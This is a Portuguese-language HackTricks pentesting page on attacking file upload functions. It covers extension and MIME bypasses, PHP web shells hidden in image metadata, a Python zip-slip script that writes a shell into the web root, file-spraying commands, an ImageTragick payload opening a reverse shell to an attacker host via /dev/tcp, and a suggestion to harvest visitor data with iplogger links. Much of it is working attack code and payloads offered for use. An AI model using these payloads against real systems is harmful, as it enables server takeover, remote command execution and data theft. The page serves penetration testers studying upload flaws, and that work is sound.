# Metodologia geral de upload de arquivos

1. Tente fazer o upload de um arquivo com **dupla extensão** \(ex: _file.png.php_ ou _file.png.php5_\).
   * Extensões PHP: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
   * Extensões ASP: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. Tente **colocar letras em maiúsculo** na extensão. Como: _.pHp, .pHP5, .PhAr ..._
3. Tente fazer o upload de **dupla \(ou mais\) extensão** \(útil para burlar verificações mal configuradas que testam se uma extensão específica está presente\):
   1. _file.png.php_
   2. _file.png.txt.php_
4. Tente fazer o upload de **dupla extensão reversa** \(útil para explorar más configurações do Apache onde qualquer coisa com extensão _.php_, mas **não necessariamente terminando em .php** executará o código\):
   * _ex: file.php.png_
5. Dupla extensão com **caractere nulo:**
   1. _ex: file.php%00.png_
6. **Adicione alguns caracteres especiais no final** da extensão_: %00, %20, \(vários pontos\)...._
   1. _file.php%00_
   2. _file.php%20_
   3. _file.php...... --&gt; No Windows, quando um arquivo é criado com pontos no final, eles serão removidos \(para que você possa burlar filtros que verificam a extensão .php\)_
   4. _file.php/_
   5. _file.php.\_
7. Bypass em verificações de Content-Type definindo o **valor** do **header Content-Type** para: _image/png_ , _text/plain , application/octet-stream_
8. Bypass em verificação de magic number adicionando no início do arquivo os **bytes de uma imagem real** \(confundir o comando _file_\). Ou introduza o shell dentro dos **metadados**: `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
   1. Também é possível que os **bytes mágicos** estejam sendo **verificados** no arquivo e você possa defini-los **em qualquer lugar do arquivo**.
9. Usando **NTFS alternate data stream \(ADS\)** no **Windows**. Nesse caso, um caractere de dois pontos ":" será inserido após uma extensão proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extensão proibida** será criado no servidor \(por exemplo, "file.asax:.jpg"\). Este arquivo pode ser editado posteriormente usando outras técnicas, como usar seu nome curto. O padrão "**::$data**" também pode ser usado para criar arquivos não vazios. Portanto, adicionar um caractere de ponto após esse padrão também pode ser útil para burlar outras restrições \(.e.g. "file.asp::$data."\)
10. **Faça o upload** da backdoor com uma **extensão permitida** \(_png_\) e reze por uma **má configuração** que execute a backdoor
11. Encontre uma vulnerabilidade para **renomear** o arquivo já carregado \(para alterar a extensão\).
12. Encontre uma vulnerabilidade de **inclusão de arquivo local** para executar a backdoor.
13. **Possível divulgação de informações**:
    1. Faça o upload **várias vezes** \(e ao mesmo tempo\) do **mesmo arquivo** com o **mesmo nome**
    2. Faça o upload de um arquivo com o **nome** de um **arquivo** ou **pasta** que **já existe**
    3. Fazer upload de um arquivo com **“.”, “..”, ou “…” como seu nome**. Por exemplo, no Apache no **Windows**, se o aplicativo salvar os arquivos carregados no diretório “/www/uploads/”, o nome de arquivo “.” criará um arquivo chamado “uploads” no diretório “/www/”.
    4. Faça o upload de um arquivo que não possa ser excluído facilmente, como **“…:.jpg”** no **NTFS**. \(Windows\)
    5. Faça o upload de um arquivo no **Windows** com **caracteres inválidos** como `|<>*?”` em seu nome. \(Windows\)
    6. Faça o upload de um arquivo no **Windows** usando **nomes reservados** \(**proibidos**\) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 e LPT9.

Tente também **fazer o upload de um executável** \(.exe\) ou um **.html** \(menos suspeito\) que **executará código** quando aberto acidentalmente pela vítima.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files" %}

Se você estiver tentando fazer upload de arquivos para um **servidor PHP**, [dê uma olhada no truque do **.htaccess** para executar código](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).  
Se você estiver tentando fazer upload de arquivos para um **servidor ASP**, [dê uma olhada no truque do **.config** para executar código](../pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` são como os arquivos `.jar` para Java, mas para PHP, e podem ser **usados como um arquivo PHP** \(executando-o com PHP ou incluindo-o dentro de um script...\)

A extensão `.inc` é às vezes usada para arquivos PHP que são usados apenas para **importar arquivos**, então, em algum momento, alguém pode ter permitido **a execução dessa extensão**.

**Verifique muitas possíveis vulnerabilidades de upload de arquivos com o plugin BurpSuit** [**https://github.com/modzero/mod0BurpUploadScanner**](https://github.com/modzero/mod0BurpUploadScanner) **ou use um aplicativo de console que encontra quais arquivos podem ser carregados e tente diferentes truques para executar código:** [**https://github.com/almandin/fuxploider**](https://github.com/almandin/fuxploider)

## **Truque de upload de arquivo/SSRF do wget**

Em algumas ocasiões, você pode descobrir que um servidor está usando **`wget`** para **baixar arquivos** e você pode **indicar** a **URL**. Nesses casos, o código pode estar verificando se a extensão dos arquivos baixados está dentro de uma lista branca para garantir que apenas arquivos permitidos sejam baixados. No entanto, **essa verificação pode ser burlada.**  
O **comprimento máximo** de um **nome de arquivo** no **Linux** é **255**, no entanto, o **wget** trunca os nomes
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Observe que **outra opção** que você pode estar pensando para contornar essa verificação é fazer com que o **servidor HTTP redirecione para um arquivo diferente**, para que a URL inicial contorne a verificação e, em seguida, o wget faça o download do arquivo redirecionado com o novo nome. Isso **não funcionará** **a menos que** o wget esteja sendo usado com o **parâmetro** `--trust-server-names`, porque **o wget fará o download da página redirecionada com o nome do arquivo indicado na URL original**.

# De upload de arquivo para outras vulnerabilidades

* Defina o **nome do arquivo** como `../../../tmp/lol.png` e tente alcançar uma **travessia de caminho**
* Defina o **nome do arquivo** como `sleep(10)-- -.jpg` e você pode ser capaz de alcançar uma **injeção de SQL**
* Defina o **nome do arquivo** como `<svg onload=alert(document.comain)>` para alcançar um XSS
* Defina o **nome do arquivo** como `; sleep 10;` para testar algumas injeções de comando \(mais [truques de injeção de comando aqui](command-injection.md)\)
* [**XSS** em upload de arquivo de imagem \(svg\)](xss-cross-site-scripting/#xss-uploading-files-svg)
* **Upload** de arquivo **JS** + **XSS** = exploração de [**Service Workers**](xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE em upload de svg**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirecionamento aberto** via upload de arquivo svg](open-redirect.md#open-redirect-uploading-svg-files)
* [Famosa vulnerabilidade de **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Se você puder **indicar ao servidor web para capturar uma imagem de uma URL**, você pode tentar abusar de um [SSRF](ssrf-server-side-request-forgery.md). Se esta **imagem** for ser **salva** em algum site **público**, você também pode indicar uma URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **roubar informações de todos os visitantes**.

Aqui está uma lista dos 10 principais itens que você pode alcançar fazendo upload \(de [link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)\):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS armazenado / SSRF / XXE
3. **GIF**: XSS armazenado / SSRF
4. **CSV**: injeção de CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : injeção de HTML / XSS / Redirecionamento aberto
8. **PNG / JPEG**: ataque de inundação de pixels \(DoS\)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

# Upload de arquivo zip descompactado automaticamente

Se você puder fazer upload de um ZIP que será descompactado dentro do servidor, poderá fazer 2 coisas:

## Symlink 

Faça upload de um link contendo links suaves para outros arquivos e, em seguida, acessando os arquivos descompactados, você acessará os arquivos vinculados:
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## Descompactar em pastas diferentes

Os arquivos descompactados serão criados em pastas inesperadas.

Pode-se facilmente assumir que essa configuração protege contra a execução de comandos de nível de sistema operacional por meio de uploads de arquivos maliciosos, mas infelizmente isso não é verdade. Como o formato de arquivo ZIP suporta compressão hierárquica e também podemos fazer referência a diretórios de nível superior, podemos escapar do diretório de upload seguro abusando da funcionalidade de descompactação do aplicativo alvo.

Um exploit automatizado para criar esse tipo de arquivos pode ser encontrado aqui: [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Algum código em Python para criar um zip malicioso: 

```python
import zipfile

zip_file = zipfile.ZipFile('malicious.zip', mode='w')
zip_file.write('evil_file.php')
zip_file.close()
```

Este código cria um arquivo zip malicioso chamado `malicious.zip` que contém um arquivo chamado `evil_file.php`.
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO 
 
def create_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
    z.writestr('otherfile.xml', 'Content of the file')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 
 
create_zip() 
```
Para conseguir a execução remota de comandos, segui os seguintes passos:

1. Criar um shell PHP:
```php
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>
```
2. Use a técnica de "file spraying" e crie um arquivo zip compactado:
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
  adding: xxAcmd.php (deflated 40%)
  adding: xxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. Use um hexeditor ou vi e mude "xxA" para "../", eu usei vi:
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
Apenas um passo restou: fazer o upload do arquivo ZIP e permitir que a aplicação o descompacte! Se tiver sucesso e o servidor web tiver privilégios suficientes para escrever nos diretórios, haverá um shell de execução de comando simples no sistema:

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**Referência**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

# ImageTragic

Faça o upload deste conteúdo com uma extensão de imagem para explorar a vulnerabilidade **\(ImageMagick, 7.0.1-1\)**.
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# Incorporando um Shell PHP em PGN

A principal razão para colocar um shell da web no chunk IDAT é que ele tem a capacidade de ignorar operações de redimensionamento e reamostragem - o PHP-GD contém duas funções para isso [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) e [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

Leia este post: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# Arquivos Poliglotas

Poliglotas, em um contexto de segurança, são arquivos que são uma forma válida de vários tipos de arquivos diferentes. Por exemplo, um [GIFAR](https://en.wikipedia.org/wiki/Gifar) é tanto um arquivo GIF quanto um arquivo RAR. Existem também arquivos que podem ser tanto GIF quanto JS, tanto PPT quanto JS, etc.

Arquivos poliglotas são frequentemente usados para contornar a proteção baseada em tipos de arquivo. Muitos aplicativos que permitem que os usuários façam upload de arquivos permitem apenas uploads de certos tipos, como JPEG, GIF, DOC, para evitar que os usuários façam upload de arquivos potencialmente perigosos como arquivos JS, arquivos PHP ou arquivos Phar.

Isso ajuda a fazer upload de um arquivo que está em conformidade com o formato de vários formatos diferentes. Isso pode permitir que você faça upload de um arquivo PHAR (PHp ARchive) que também parece um JPEG, mas provavelmente você ainda precisará de uma extensão válida e, se a função de upload não permitir, isso não ajudará.

Mais informações em: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
